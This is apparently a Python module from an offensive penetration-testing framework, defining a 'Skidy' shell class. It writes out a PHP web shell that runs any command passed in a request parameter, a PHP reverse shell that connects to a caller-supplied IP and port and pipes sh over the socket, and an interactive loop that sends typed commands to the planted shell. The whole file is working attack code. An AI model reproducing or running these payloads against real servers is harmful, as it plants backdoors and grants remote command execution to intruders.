from ..Shells import Shells
from Utils.Web import simple_get

from termcolor import cprint
import urllib.parse


class Skidy(Shells):
    def skidy_web(self):
        filename = self.create_shellname("Lists/skidy.txt", 1)
        web = """echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' > """
        web += filename
        filename = "/" + filename

        Shells.send_shell(self, web, filename, "skidy", "cmd", "webshells")

    def skidy_rev(self):
        filename = self.create_shellname("Lists/skidy.txt", 1)
        rev = """echo '<?php if(isset($_REQUEST["ip"]) && isset($_REQUEST["port"])){ $i = $_REQUEST["ip"]; $p = $_REQUEST["port"];$sock=fsockopen($i,$p);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); } ?>' > """
        rev += filename
        filename = "/" + filename

        Shells.send_shell(self, rev, filename, "skidy", "ip,port", "revshells")

    def skidy_access(self, shellTuple):
        cmd = b""
        encoding = "utf-8"

        path = shellTuple.filepath + "?" + shellTuple.cmd + "="

        while(cmd.decode(encoding).lower() != "quit"):
            cprint("Skidy CMD: ", "blue", end="")
            cmd = input().encode("ascii")

            # Checks for exit
            if(cmd == "exit".encode("ascii")): return

            cmd_encoded = urllib.parse.quote_plus(cmd)
            simple_get(self.loginSession, path, cmd_encoded, 1)
